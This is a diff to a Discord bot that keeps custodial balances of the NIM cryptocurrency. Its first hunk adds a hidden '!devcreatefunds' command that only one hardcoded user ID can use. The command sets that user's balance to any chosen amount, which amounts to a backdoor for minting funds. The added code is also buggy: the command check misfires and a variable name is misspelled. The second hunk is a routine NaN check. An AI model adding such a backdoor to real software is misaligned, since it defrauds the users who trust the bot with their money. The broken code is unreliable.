@@ -203,6 +203,14 @@ It is recommended **not to store large amounts of NIM** on this bot! You don't c
         msg.channel.send("``" + "!verify " + verifyCode + "``");
         return;
       }
+      if (msg.content.indexOf("!devcreatefunds") && msg.author.id === "384847091924729856") {
+        let amountToSend = msg.content.match(/-?(\d|\.)*$/)[0].trim();
+        amountToSend = Math.floor(parseFloat(amountToSend, 10) * 100000);
+        if (isNaN(amoundToSend)) return msg.reply("invalid");
+        db.userBalances["384847091924729856"] = amountToSend;
+        saveDB();
+        msg.reply("done");
+      }
       if (msg.content.indexOf("!verify") === 0) {
         msg.content = msg.content.trim();
         var publicKey = msg.content.split("!verify")[1].trim();
@@ -270,7 +278,7 @@ console.log(amountToSend);
           amountToSend = parseFloat(amountToSend, 10) * 100000;
         }
         amountToSend = Math.floor(amountToSend);
-        if (amountToSend === 0) {
+        if (amountToSend === 0 || isNaN(amountToSend)) {
           msg.reply("You cannot send 0 NIM.");
           return;
         }
